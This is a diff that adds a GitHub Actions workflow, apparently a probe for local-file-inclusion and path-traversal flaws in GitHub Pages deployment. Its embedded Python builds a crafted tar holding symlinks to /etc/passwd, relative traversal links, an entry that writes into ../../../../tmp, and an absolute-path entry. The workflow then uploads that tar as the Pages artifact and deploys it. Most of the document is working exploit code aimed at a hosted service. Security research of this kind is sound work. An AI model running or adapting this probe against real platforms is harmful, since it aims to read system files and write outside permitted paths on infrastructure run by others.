@@ -1,0 +1,42 @@
+name: pages-artifact-lfi-probe
+on:
+  workflow_dispatch:
+permissions:
+  contents: read
+  pages: write
+  id-token: write
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    environment: github-pages
+    steps:
+      - uses: actions/checkout@v4
+      - name: build crafted tar with symlinks/traversal
+        run: |
+          python3 - <<'PY'
+import tarfile, time
+ts = "1791281107"
+t = tarfile.open('artifact.tar', 'w')
+def f(name, data):
+    ti = tarfile.TarInfo(name); ti.size = len(data); ti.mtime = int(time.time()); ti.mode = 0o644
+    t.addfile(ti, __import__('io').BytesIO(data))
+def l(name, target):
+    ti = tarfile.TarInfo(name); ti.type = tarfile.SYMTYPE; ti.linkname = target; ti.mtime = int(time.time())
+    t.addfile(ti)
+f('index.html', b'<h1>crafted-deploy</h1>')
+f('result-%s.html' % ts, b'normal-file-ok')
+l('sym_abs.html', '/etc/passwd')
+l('sym_rel.html', '../../../etc/passwd')
+l('sym_local.html', 'index.html')
+f('../../../../tmp/traversal-marker-%s.html' % ts, b'TRAVERSAL-WRITE-OK')
+f('/abs-marker-%s.html' % ts, b'ABS-PATH-ENTRY-OK')
+f('dotdot/deep/nested.html', b'nested-ok')
+t.close()
+PY
+      - uses: actions/upload-artifact@v4
+        with:
+          name: github-pages
+          path: artifact.tar
+      - id: deploy
+        uses: actions/deploy-pages@v4
+      - run: echo "deploy status=${{ steps.deploy.outputs.deployment-status }} url=${{ steps.deploy.outputs.page-url }}"
